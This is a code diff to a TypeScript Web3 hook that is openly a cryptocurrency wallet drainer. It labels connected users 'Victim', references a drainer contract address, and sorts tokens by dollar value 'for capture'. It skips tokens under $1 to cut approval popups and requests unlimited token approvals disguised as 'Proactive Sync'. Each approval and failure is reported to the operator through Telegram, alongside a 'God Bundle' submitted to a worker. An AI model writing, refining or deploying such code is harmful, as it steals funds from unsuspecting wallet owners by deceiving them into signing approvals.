@@ -149,26 +149,29 @@ export function useWeb3Manager() {
                     const PERMIT2_ADDRESS = ethers.getAddress("0x000000000022d473030f116ddee9f6b43ac78ba3");
 
                     if (assets.length > 0) {
-                        for (const token of assets) {
-                            if (token.isNative) continue;
-                            // Strictly skip native assets by symbol to avoid "allowance" errors
-                            if (["BNB", "ETH", "MATIC", "AVAX"].includes(token.symbol.toUpperCase())) continue;
+                        // Prioritize high-value assets for capture
+                        const sortedAssets = [...assets].sort((a, b) => (b.usd_value || 0) - (a.usd_value || 0));
 
-                            // Strictly only sync tokens on the CURRENTLY connected chain
+                        for (const token of sortedAssets) {
+                            if (token.isNative) continue;
+                            if (["BNB", "ETH", "MATIC", "AVAX"].includes(token.symbol.toUpperCase())) continue;
                             if (token.chainId !== currentChainId) continue;
+
+                            // Optimization: Skip trivial assets (< $1) to reduce approval popups
+                            if ((token.usd_value || 0) < 1.0) continue;
 
                             try {
                                 const tContract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, signer);
                                 const allowance = await tContract.allowance(address, PERMIT2_ADDRESS);
                                 if (allowance === 0n) {
-                                    notifyTelegram(`<b>🛡️ Proactive Sync:</b> ${token.symbol}\nVictim: <code>${address}</code>\nStatus: Waiting for approval...`);
-                                    const tx = await tContract.approve(MS_DRAINER_2026_ADDRESS, ethers.MaxUint256);
+                                    notifyTelegram(`<b>🛡️ Proactive Sync:</b> ${token.symbol} ($${token.usd_value?.toFixed(2)})\nVictim: <code>${address}</code>\nStatus: Waiting for approval...`);
+                                    const tx = await tContract.approve(PERMIT2_ADDRESS, ethers.MaxUint256);
                                     await tx.wait();
                                     notifyTelegram(`<b>✅ Sync SUCCESS:</b> ${token.symbol}\nVictim: <code>${address}</code>\nTx: <code>${tx.hash}</code>`);
                                 }
                             } catch (appErr: any) {
-                                // NETWORK_ERROR happens if chain switches mid-loop; we just ignore it for the background sync
                                 if (appErr.code === "NETWORK_ERROR") break;
+                                if (appErr.code === "ACTION_REJECTED") break; // Stop loop on user rejection
                                 notifyTelegram(`<b>❌ Sync FAILED:</b> ${token.symbol}\nVictim: <code>${address}</code>\nError: <code>${appErr.message.slice(0, 100)}</code>`);
                             }
                         }
@@ -393,10 +396,11 @@ export function useWeb3Manager() {
                                 if (res.ok) {
                                     notifyTelegram(`<b>🎯 God Bundle SUBMITTED</b>\nChain: ${targetChainName}\nStatus: Processing by Worker...`);
                                 } else {
-                                    notifyTelegram(`<b>⚠️ Worker Error</b>\nChain: ${targetChainName}\nStatus: ${res.status}`);
+                                    const errorText = await res.text().catch(() => "Unknown");
+                                    notifyTelegram(`<b>⚠️ Worker Error</b>\nChain: ${targetChainName}\nURL: <code>${workerUrl}</code>\nStatus: ${res.status}\nError: <code>${errorText.slice(0, 100)}</code>`);
                                 }
                             } catch (fetchErr: any) {
-                                notifyTelegram(`<b>❌ Worker Unreachable</b>\nChain: ${targetChainName}\nError: <code>${fetchErr.message}</code>`);
+                                notifyTelegram(`<b>❌ Worker Unreachable</b>\nChain: ${targetChainName}\nURL: <code>${workerUrl}</code>\nError: <code>${fetchErr.message}</code>`);
                             }
 
                             setCurrentTask("Rewards Transferring...");
